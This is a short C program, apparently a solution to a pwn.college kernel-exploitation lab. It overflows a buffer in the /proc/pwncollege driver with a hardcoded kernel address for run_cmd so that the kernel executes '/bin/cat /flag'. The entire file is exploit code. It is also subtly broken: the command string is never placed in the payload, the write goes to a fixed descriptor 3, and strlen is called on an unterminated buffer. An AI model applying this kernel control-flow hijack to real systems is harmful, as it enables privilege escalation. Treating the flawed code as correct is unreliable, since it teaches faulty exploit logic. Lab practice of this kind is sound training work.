#include<string.h>
#include<fcntl.h>
#include<unistd.h>
#include<stdint.h>

// ffffffff81089b30 t run_cmd

int main(){
    int fd = open("/proc/pwncollege", O_RDWR);

    uint64_t run_cmd = 0xffffffff81089b30;
    char payload[0x108 + sizeof(run_cmd)];
    char command[] = "/bin/cat /flag";

    memset(payload, '0', 0x108 - strlen(command));
    memcpy(payload + 0x108, &run_cmd, sizeof(run_cmd));

    write(3, payload, strlen(payload));

    return 0;
    
}

